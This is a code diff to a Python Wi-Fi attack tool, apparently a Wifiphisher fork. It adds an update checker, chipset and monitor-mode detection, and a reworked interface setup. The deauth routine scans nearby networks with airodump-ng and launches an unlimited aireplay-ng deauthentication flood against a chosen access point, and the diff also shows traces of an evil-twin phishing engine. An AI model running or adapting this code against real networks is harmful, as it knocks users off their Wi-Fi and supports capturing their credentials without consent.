@@ -12,7 +12,7 @@ from colorama import Fore, Style, init
 init(autoreset=True)
 iface2 = None
 networks = []
-version = "1.1"  
+version = "1.2"  
 
 def banner():
     print(Fore.GREEN + Style.BRIGHT + r"""
@@ -45,7 +45,32 @@ def check_internet():
 
     
     exit()
-    
+  
+def check_update():
+    try:
+        response = requests.get("https://www.google.com", timeout=5)
+        if response.status_code == 200:
+            print(Fore.GREEN + "\n🟢 Internet is connected.")
+            version_url = "https://raw.githubusercontent.com/Darkhaxxor005/Wifiphisher/refs/heads/main/version.txt"
+            try:
+               print(f"\n{Fore.CYAN}🕒 Checking for updates...")
+               response = requests.get(version_url)
+               response.raise_for_status()
+               remote_version = response.text.strip()
+               if version < remote_version:
+                  print(f"\n{Fore.YELLOW}📦 Update available: {Fore.GREEN}{remote_version} {Fore.YELLOW}(current: {version})")
+                  return
+               else:
+                  print(f"\n{Fore.GREEN}🕒 Already up to date. (version: {version})")
+            except requests.RequestException as e:
+                  print(f"\n{Fore.RED}🔴 Failed to check version: {e}")
+                  return
+    except requests.ConnectionError:
+        print(Fore.RED + "\n🔴 No internet connection.")
+    except requests.Timeout:
+        print(Fore.YELLOW + "🟡 Connection timed out.")
+    return
+        
 def revert_to_user():
     if os.geteuid() == 0:
         original_user = os.environ.get("SUDO_USER")
@@ -138,7 +163,7 @@ def check():
     def install(pkg):
         print(f"\n{Fore.YELLOW}⏳ Installing {pkg}...")
         subprocess.run(['sudo', 'apt', 'install', '-y', pkg])
-
+            
     # Check and install hostapd
     if is_installed_binary('hostapd'):
         print(f"\n{Fore.GREEN}🟢 hostapd is already installed.")
@@ -150,6 +175,13 @@ def check():
         print(f"\n{Fore.GREEN}🟢 gnome-terminal is already installed.")
     else:
         install('gnome-terminal')
+     
+def run_command(command):
+    try:
+        subprocess.run(command, shell=True, check=True)
+        print(f"\n{Fore.GREEN}🟢 Successfully executed: {Fore.YELLOW}{command}")
+    except subprocess.CalledProcessError:
+        print(f"{Fore.RED}🔴 Error executing: {Fore.YELLOW}{command}{Fore.RESET}")
 
 def get_wireless_interfaces():
     result = subprocess.run(["iwconfig"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
@@ -160,18 +192,87 @@ def get_wireless_interfaces():
             interfaces.append(iface)
     return interfaces
 
+def get_chipset_info():
+    result = subprocess.run(["airmon-ng"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
+    output = result.stdout.splitlines()
+    chipset_map = {}
+
+    # Skip header lines and parse rows
+    for line in output:
+        if line.strip().startswith("PHY") or line.strip() == "" or line.startswith("Interface"):
+            continue
+        parts = line.split()
+        if len(parts) >= 4:
+            interface = parts[1]
+            chipset = " ".join(parts[3:])  # Combine the rest into the chipset name
+            chipset_map[interface] = chipset
+    return chipset_map
+    
+def check_modes():
+    interfaces = get_wireless_interfaces()
+    interface_count = len(interfaces)
+
+    # Get full `iw list` output
+    result = subprocess.run("iw list", shell=True,
+                            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
+    output = result.stdout
+
+    # Extract all blocks with "Supported interface modes"
+    blocks = []
+    lines = output.splitlines()
+    i = 0
+    while i < len(lines):
+        if "Supported interface modes" in lines[i]:
+            block = []
+            i += 1
+            while i < len(lines) and (lines[i].strip().startswith("*") or lines[i].strip() == ""):
+                block.append(lines[i].strip())
+                i += 1
+            blocks.append(block)
+        else:
+            i += 1
+
+    # Count how many of those blocks support AP and monitor
+    ap_count = sum(1 for block in blocks if "* AP" in block)
+    monitor_count = sum(1 for block in blocks if "* monitor" in block)
+
+    # AP mode report
+    if ap_count >= interface_count:
+        print(Fore.GREEN + "\n🟢 All interface supports AP mode.")
+    elif ap_count == 0:
+        print(Fore.RED + "\n🔴 No AP mode supported interface.")
+    else:
+        print(Fore.YELLOW + f"\n🟡 {ap_count} interface{'s' if ap_count > 1 else ''} supports AP mode.")
+
+    # Monitor mode report
+    if monitor_count >= interface_count:
+        print(Fore.GREEN + "\n🟢 All interface supports monitor mode.")
+    elif monitor_count == 0:
+        print(Fore.RED + "\n🔴 No monitor mode supported interface.")
+    else:
+        print(Fore.YELLOW + f"\n🟡 {monitor_count} interface{'s' if monitor_count > 1 else ''} supports monitor mode.")
+        
 def select_interface():
     interfaces = get_wireless_interfaces()
     if not interfaces:
         print(Fore.RED + "\n🔴 No wireless interfaces found.")
         exit(1)
+
+    check_modes()
+
+    chipsets = get_chipset_info()
     
     print(Fore.CYAN + "\n📶 Available Wireless Interfaces \n")
     for i, iface in enumerate(interfaces, 1):
-        print(f"{i}. {iface}")
-    
-    choice = int(input(Fore.YELLOW + f"\n💡 Select interface number: {Style.RESET_ALL}"))
-    return interfaces[choice - 1]
+        description = chipsets.get(iface, "Unknown Chipset")
+        print(f"{Style.RESET_ALL}{i}. {iface}   {Fore.GREEN}{description}")
+
+    try:
+        choice = int(input(Fore.YELLOW + f"\n💡 Select interface number: {Style.RESET_ALL}"))
+        return interfaces[choice - 1]
+    except (ValueError, IndexError):
+        print(Fore.RED + "❌ Invalid selection.")
+        exit(1)
 
 def signal_strength_color(power):
     try:
@@ -185,14 +286,14 @@ def signal_strength_color(power):
     except:
         return Fore.WHITE + "📴 Unknown\n"
 
-def scan_networks(mon_interface):
+def scan_networks(iface):
     print(Fore.GREEN + "\n🔍 Scanning for networks...")
     dump_file = "quick_scan"
     proc = subprocess.Popen([
         "sudo", "airodump-ng",
         "-w", dump_file,
         "--output-format", "csv",
-        mon_interface
+        iface
     ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
     time.sleep(10)
@@ -232,32 +333,35 @@ def scan_networks(mon_interface):
 
     return networks
 
-def deauth(bssid, channel, mon_interface, count=0):
+def deauth(bssid, channel, iface, count=0):
     try:
         print(Fore.CYAN + f"\n🔧 Setting channel {channel}...")
-        subprocess.run(["sudo", "iwconfig", mon_interface, "channel", channel], check=True)
+        subprocess.run(["sudo", "iwconfig", iface, "channel", channel], check=True)
 
         print(Fore.GREEN + f"\n🔧 Launching deauth attack on {bssid} (channel {channel}) 🚨\n")
         subprocess.run([
             "sudo", "aireplay-ng",
             "--deauth", str(count),
             "-a", bssid,
-            mon_interface
+            iface
         ])
     except KeyboardInterrupt:
         print(Fore.RED + "\n🔴 Attack stopped by user.")
 
 def enable():
     banner()
+    check_update()
     print(Fore.CYAN + "\n🎯 Enter interface for deauth attack 🔽")
     iface = select_interface()
-
+    print(Fore.CYAN + f"\n🔧 Stopping conflicting services ...")
+    run_command("sudo systemctl stop NetworkManager wpa_supplicant")
     print(Fore.CYAN + f"\n🔧 Enabling monitor mode on {iface}...")
-    subprocess.run(["sudo", "airmon-ng", "start", iface])
-    mon_interface = iface + "mon"
+    run_command(f"sudo ip link set {iface} down")
+    run_command(f"sudo iw {iface} set monitor control")
+    run_command(f"sudo ip link set {iface} up")
     time.sleep(2)
 
-    found = scan_networks(mon_interface)
+    found = scan_networks(iface)
 
     if not found:
         print(Fore.RED + "\n🔴 No networks found.")
@@ -267,12 +371,16 @@ def enable():
         choice = int(input(Fore.YELLOW + f"\n💡 Select network number to attack: {Style.RESET_ALL}"))
         bssid, channel, essid = found[choice - 1]
         print(Fore.GREEN + f"\n🟢 Target: {essid} ({bssid}) on channel {channel}")
-        deauth(bssid, channel, mon_interface)
+        deauth(bssid, channel, iface)
     except (IndexError, ValueError):
         print(Fore.RED + "\n🔴 Invalid selection.")
     finally:
         print(Fore.RED + "\n\n🔴 Ctrl + C triggered. Cleaning up and exiting...")
-        subprocess.run(["sudo", "airmon-ng", "stop", mon_interface])
+        run_command(f"sudo ip link set {iface} down")
+        run_command(f"sudo iw {iface} set type managed")
+        run_command(f"sudo ip link set {iface} up")
+        run_command("sudo systemctl restart NetworkManager")
+        run_command("sudo systemctl restart wpa_supplicant")       
         clear_csv_files()
         time.sleep(1)
         exit()
@@ -405,13 +513,6 @@ RewriteRule ^.*$ /index.html [L]"""
     except PermissionError:
         print(f"\n{Fore.RED}🔴 Failed to write to {original_conf}. {Fore.RESET}Run with sudo.")
     
-def run_command(command):
-    try:
-        subprocess.run(command, shell=True, check=True)
-        print(f"\n{Fore.GREEN}🟢 Successfully executed: {Fore.YELLOW}{command}")
-    except subprocess.CalledProcessError:
-        print(f"{Fore.RED}🔴 Error executing: {Fore.YELLOW}{command}{Fore.RESET}")
-
 def engine():
     # Step 1: Stop Network Manager
     print(f"\n{Fore.YELLOW}🔧 Stopping Network Manager...")
@@ -790,6 +891,7 @@ def main():
             updater()
             exit()
         banner()
+        check_update()
         check()
         if '--deauth' in sys.argv:
             subprocess.Popen(['gnome-terminal', '--', 'python3', sys.argv[0], '--run-deauth'])
